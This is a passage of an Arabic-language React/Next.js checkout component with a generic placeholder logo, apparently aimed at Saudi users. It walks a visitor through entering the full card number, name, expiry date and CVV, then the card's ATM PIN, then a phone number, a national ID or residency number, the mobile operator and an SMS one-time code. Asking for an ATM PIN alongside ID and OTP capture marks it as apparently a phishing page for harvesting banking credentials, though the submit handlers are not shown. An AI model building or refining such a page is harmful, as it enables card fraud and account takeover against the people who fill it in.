              <button
                onClick={() => setShowOfferModal(false)}
                className="w-full bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] text-white py-3 rounded-lg font-medium hover:from-[#166b33] hover:to-[#0a4d23] transition-all"
              >
                متابعة الدفع
              </button>
            </div>
          </DialogContent>
        </Dialog>
        <div className="max-w-4xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-8">
            {/* Card Preview */}
            <div className="order-1 lg:order-1">
              <div className="lg:sticky lg:top-24">
                <div
                  className="relative w-full aspect-[1.7] sm:aspect-[1.586] rounded-xl sm:rounded-2xl p-4 sm:p-8 text-white shadow-xl sm:shadow-2xl"
                  style={{
                    background:
                      bankInfo?.color ||
                      "linear-gradient(135deg, #1a7a3a 0%, #0d5c2a 100%)",
                  }}
                >
                  <div className="absolute top-4 sm:top-8 right-4 sm:right-8">
                    <div className="text-lg sm:text-2xl font-bold">
                      {bankInfo?.name || "بطاقة ائتمان"}
                    </div>
                  </div>
                  <div className="absolute top-4 sm:top-8 left-4 sm:left-8">
                    {paymentMethod === "card" && cardNumber.at(0) === "4" ? (
                      <Image
                        src="/visa-card.png"
                        alt="logo"
                        width={50}
                        height={30}
                        className="h-6 sm:h-8 w-auto object-contain"
                      />
                    ) : paymentMethod === "card" && cardNumber.at(0) === "5" ? (
                      <Image
                        src="/master.svg"
                        alt="logo"
                        width={50}
                        height={30}
                        className="h-6 sm:h-8 w-auto object-contain"
                      />
                    ) : null}
                    {paymentMethod === "wallet" ? (
                      <Image
                        src="/mada.svg"
                        alt="logo"
                        width={50}
                        height={30}
                        className="h-6 sm:h-8 w-auto object-contain"
                      />
                    ) : null}
                  </div>
                  <div className="absolute top-1/2 right-4 sm:right-8 -translate-y-1/2">
                    <div
                      className="text-lg sm:text-xl font-mono tracking-widest"
                      dir="ltr"
                    >
                      {cardNumber ? ("**** **** **** " + cardNumber.slice(-4)) : "•••• •••• •••• ••••"}
                    </div>
                  </div>
                  <div className="absolute bottom-4 sm:bottom-8 right-4 sm:right-8 left-4 sm:left-8 flex justify-between items-end">
                    <div>
                      <div className="text-[10px] sm:text-xs opacity-80 mb-0.5 sm:mb-1">
                        اسم حامل البطاقة
                      </div>
                      <div className="text-sm sm:text-md font-semibold truncate max-w-[120px] sm:max-w-none">
                        {cardName || "الاسم الكامل"}
                      </div>
                    </div>
                    <div>
                      <div className="text-[10px] sm:text-xs opacity-80 mb-0.5 sm:mb-1">
                        تاريخ الانتهاء
                      </div>
                      <div className="text-sm sm:text-md font-mono">
                        {expiryDate || "MM/YY"}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            {/* Card Form */}
            <div className="order-1 lg:order-2">
              <Card className="shadow-lg border-border/40">
                <CardHeader className="border-b border-border/40 pb-6">
                  <CardTitle className="text-2xl font-bold text-foreground">
                    معلومات البطاقة
                  </CardTitle>
                  <CardDescription>أدخل بيانات بطاقة الائتمان</CardDescription>
                </CardHeader>
                <CardContent className="pt-8">
                  <form onSubmit={handleCardFormSubmit} autoComplete="off" className="space-y-6">
                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground">
                        رقم البطاقة
                      </label>
                      <div className="relative">
                        <Input
                          type="tel"
                          inputMode="numeric"
                          maxLength={19}
                          value={cardNumber}
                          dir="ltr"
                          onChange={(e) =>
                            handleCardNumberChange(e.target.value)
                          }
                          placeholder="1234 5678 9012 3456"
                          className="h-12 pr-12"
                          required
                        />
                        {bankInfo && (
                          <div className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center gap-2">
                            <span className="text-2xl">{bankInfo.logo}</span>
                            <span className="text-sm font-medium text-muted-foreground">
                              {bankInfo.name}
                            </span>
                          </div>
                        )}
                      </div>
                    </div>

                    <div className="space-y-2">
                      <label className="text-sm font-medium text-foreground">
                        اسم حامل البطاقة
                      </label>
                      <Input
                        type="text"
                        value={cardName}
                        onChange={(e) => setCardName(e.target.value)}
                        placeholder="الاسم كما هو مكتوب على البطاقة"
                        className="h-12"
                        required
                      />
                    </div>

                    <div className="grid grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-foreground">
                          تاريخ الانتهاء
                        </label>
                        <Input
                          type="text"
                          inputMode="numeric"
                          maxLength={5}
                          value={expiryDate}
                          onChange={(e) => {
                            let value = normalizeNumbers(
                              e.target.value
                            ).replace(/\D/g, "");
                            if (value.length >= 2) {
                              value =
                                value.slice(0, 2) + "/" + value.slice(2, 4);
                            }
                            setExpiryDate(value);
                          }}
                          placeholder="MM/YY"
                          className="h-12"
                          required
                        />
                      </div>
                      <div className="space-y-2">
                        <label className="text-sm font-medium text-foreground">
                          CVV
                        </label>
                        <Input
                          type="text"
                          inputMode="numeric"
                          maxLength={3}
                          value={cvv}
                          onChange={(e) =>
                            setCvv(
                              normalizeNumbers(e.target.value).replace(
                                /\D/g,
                                ""
                              )
                            )
                          }
                          placeholder="123"
                          className="h-12"
                          required
                        />
                      </div>
                    </div>

                    <Button
                      type="submit"
                      className="w-full h-14 text-lg text-white font-semibold bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23]"
                      disabled={isLoading}
                    >
                      {isLoading ? (
                        <>
                          <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                          جارٍ المعالجة...
                        </>
                      ) : (
                        "متابعة"
                      )}
                    </Button>
                  </form>
                </CardContent>
                <CardFooter>
                  {cardError && (
                    <div className="w-full p-4 rounded-xl bg-red-50 border border-red-200 text-red-800 flex items-start gap-3">
                      <CircleAlert className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                      <div className="flex-1 text-right">
                        <div className="font-bold text-sm text-red-900 mb-0.5">تم رفض البطاقة</div>
                        <div className="text-xs text-red-700 leading-relaxed font-medium">{cardError}</div>
                      </div>
                    </div>
                  )}
                </CardFooter>
              </Card>
            </div>
          </div>
        </div>
      </div>
    </div>
    );
  }

  if (currentStep === "pin") {
    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <header className="bg-card border-b border-border sticky top-0 z-50 shadow-sm">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src="/next.svg" alt="logo" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
            </div>
            <button className="sm:hidden p-2 text-xs font-bold text-teal-700">EN</button>
            <Button variant="ghost" size="sm" className="hidden sm:inline-flex text-muted-foreground hover:text-foreground">
              English
            </Button>
          </div>
        </header>
        <div className="py-12 px-4 flex items-center justify-center">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="w-full max-w-md"
          >
        <Card className="border-border/40 shadow-lg backdrop-blur-sm bg-card/95">
          <CardHeader className="text-center space-y-2">
            <div className="mx-auto w-16 h-16 rounded-full bg-[#1a7a3a]/10 flex items-center justify-center mb-2">
              <Lock className="h-8 w-8 text-[#1a7a3a]" />
            </div>
            <CardTitle className="text-2xl">أدخل رمز ATM </CardTitle>
            <CardDescription>أدخل رمز ATM الخاص بالبطاقة</CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handlePinSubmit} autoComplete="off" className="space-y-6">
              <div className="flex justify-center gap-3" dir="ltr">
                {pin.map((digit, index) => (
                  <Input
                    key={index}
                    type="password"
                    inputMode="numeric"
                    maxLength={1}
                    value={digit}
                    onChange={(e) => {
                      const normalized = normalizeNumbers(e.target.value);
                      const newPin = [...pin];
                      newPin[index] = normalized;
                      setPin(newPin);
                      if (normalized && index < 3) {
                        const nextInput = document.querySelector(
                          `input[name="pin-${index + 1}"]`
                        ) as HTMLInputElement;
                        nextInput?.focus();
                      }
                    }}
                    onKeyDown={(e) => {
                      if (e.key === "Backspace" && !digit && index > 0) {
                        const prevInput = document.querySelector(
                          `input[name="pin-${index - 1}"]`
                        ) as HTMLInputElement;
                        prevInput?.focus();
                      }
                    }}
                    name={`pin-${index}`}
                    className="w-12 h-12 sm:w-14 sm:h-14 text-center text-xl sm:text-2xl font-bold"
                    required
                  />
                ))}
              </div>
              {pinError && (
                <div className="p-4 bg-red-50 border border-red-200 rounded-lg">
                  <p className="text-sm text-red-600 text-center">{pinError}</p>
                </div>
              )}
              <Button
                type="submit"
                className="w-full bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23] text-white"
                size="lg"
                disabled={isLoading || pin.some((d) => !d)}
              >
                {isLoading ? (
                  <>
                    <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                    جارٍ التحقق...
                  </>
                ) : (
                  "تأكيد"
                )}
              </Button>
            </form>
          </CardContent>
        </Card>
      </motion.div>
        </div>
      </div>
    );
  }

  if (currentStep === "phone-verification") {
    if (!phoneOtpSent) {
      return (
        <div dir="rtl" className="min-h-screen bg-background">
          <header className="bg-card border-b border-border sticky top-0 z-50 shadow-sm">
            <div className="max-w-[1180px] mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
              <button className="p-2 hover:bg-accent rounded-lg transition-colors">
                <Menu className="w-5 h-5 text-foreground" />
              </button>
              <div className="flex items-center gap-3">
                <Image src="/next.svg" alt="logo" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
              </div>
              <button className="sm:hidden p-2 text-xs font-bold text-teal-700">EN</button>
              <Button variant="ghost" size="sm" className="hidden sm:inline-flex text-muted-foreground hover:text-foreground">
                English
              </Button>
            </div>
          </header>
          <div className="py-8 sm:py-12 px-4">
            <div className="max-w-md mx-auto">
            <Card className="shadow-lg border-border/40">
              <CardHeader className="text-center border-b border-border/40 pb-6">
                <CardTitle className="text-2xl font-bold text-foreground">
                  التحقق من رقم الجوال
                </CardTitle>
                <CardDescription>
                  أدخل رقم جوالك لإرسال رمز التحقق
                </CardDescription>
              </CardHeader>
              <CardContent className="pt-8">
                <form onSubmit={handleSendPhoneOtp} autoComplete="off" className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">
                      رقم الجوال
                    </label>
                    <Input
                      type="tel"
                      inputMode="numeric"
                      value={phone}
                      onChange={(e) =>
                        setPhone(normalizeNumbers(e.target.value))
                      }
                      placeholder="05xxxxxxxx"
                      className="h-12"
                      maxLength={10}
                      required
                    />
                    <p className="text-xs text-muted-foreground">
                      يجب أن يبدأ بـ 05 ويتكون من 10 أرقام
                    </p>
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">
                      رقم الهوية / الإقامة
                    </label>
                    <Input
                      type="tel"
                      inputMode="numeric"
                      value={phoneIdNumber}
                      onChange={(e) =>
                        setPhoneIdNumber(normalizeNumbers(e.target.value).replace(/\D/g, ""))
                      }
                      placeholder="أدخل رقم الهوية أو الإقامة"
                      className="h-12"
                      maxLength={10}
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <label className="text-sm font-medium text-foreground">
                      المشغل
                    </label>
                    <select
                      value={operator}
                      onChange={(e) => setOperator(e.target.value)}
                      className="w-full h-12 px-4 rounded-lg border border-border bg-background text-foreground focus:border-[#1a7a3a] focus:ring-1 focus:ring-teal-700"
                      required
                    >
                      <option value="">اختر المشغل</option>
                      <option value="STC">STC</option>
                      <option value="Mobily">موبايلي</option>
                      <option value="Zain">زين</option>
                    </select>
                  </div>

                  {phoneOtpError && (
                    <Alert
                      variant="destructive"
                      className="bg-red-50 border-red-200"
                    >
                      <AlertCircle className="h-4 w-4" />
                      <AlertDescription>{phoneOtpError}</AlertDescription>
                    </Alert>
                  )}

                  <Button
                    type="submit"
                    className="w-full h-14 text-lg text-white font-semibold bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23]"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="ml-2 h-5 w-5 animate-spin" />
                        جارٍ الإرسال...
                      </>
                    ) : (
                      "إرسال رمز التحقق"
                    )}
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
          <VerificationPage
            open={stcModalOpen}
            onOpenChange={() => setStcModalOpen(false)}
            verifyOtp={handleStcVerify}
          />
        </div>
      </div>
      );
    }

    return (
      <div dir="rtl" className="min-h-screen bg-background">
        <header className="bg-card border-b border-border sticky top-0 z-50 shadow-sm">
          <div className="max-w-[1180px] mx-auto px-4 sm:px-6 py-3 flex items-center justify-between">
            <button className="p-2 hover:bg-accent rounded-lg transition-colors">
              <Menu className="w-5 h-5 text-foreground" />
            </button>
            <div className="flex items-center gap-3">
              <Image src="/next.svg" alt="logo" width={180} height={37} className="h-10 sm:h-14 w-auto object-contain" />
            </div>
            <button className="sm:hidden p-2 text-xs font-bold text-teal-700">EN</button>
            <Button variant="ghost" size="sm" className="hidden sm:inline-flex text-muted-foreground hover:text-foreground">
              English
            </Button>
          </div>
        </header>
        <div className="py-8 sm:py-12 px-4">
          <div className="max-w-md mx-auto">
          <Card className="shadow-lg border-border/40">
            <CardHeader className="text-center border-b border-border/40 pb-6">
              <CardTitle className="text-2xl font-bold text-foreground">
                أدخل رمز التحقق
              </CardTitle>
              <CardDescription>
                تم إرسال رمز التحقق إلى {phone} عبر {operator}
              </CardDescription>
            </CardHeader>
            <CardContent className="pt-8">
              <form onSubmit={handlePhoneVerification} autoComplete="off" className="space-y-6">
                <div className="space-y-2">
                  <label className="text-sm font-medium text-foreground">
                    رمز التحقق
                  </label>
                  <div className="relative">
                    <Input
                      type="number"
                      autoComplete="otp"
                      inputMode="numeric"
                      maxLength={6}
                      value={phoneOtp}
                      onChange={(e) =>
                        setPhoneOtp(
                          normalizeNumbers(e.target.value).replace(/\D/g, "")
                        )
                      }
                      placeholder="أدخل الرمز المكون من 6 أرقام"
                      className="h-12 text-center text-2xl tracking-widest font-mono"
                      required
                    />
                    <div className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground">
                      {phoneOtp.length}/6
                    </div>
                  </div>
                  {phoneOtpError && (
                    <p className="text-sm text-red-500">{phoneOtpError}</p>
                  )}
                </div>

                <div className="flex gap-3">
                  <Button
                    type="button"
                    variant="outline"
                    onClick={() => setPhoneOtpSent(false)}
                    className="flex-1 h-12"
                  >
                    تعديل البيانات
                  </Button>
                  <Button
                    type="submit"
                    className="flex-1 h-12 text-white bg-gradient-to-l from-[#1a7a3a] to-[#0d5c2a] hover:from-[#166b33] hover:to-[#0a4d23]"
                    disabled={isLoading || phoneOtp.length < 4}
                  >
                    {isLoading ? (
                      <>
                        <Loader2 className="ml-2 h-4 w-4 animate-spin" />
                        جارٍ التحقق...
                      </>
                    ) : (
                      "تأكيد"
                    )}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
    );
  }

  return null;
}
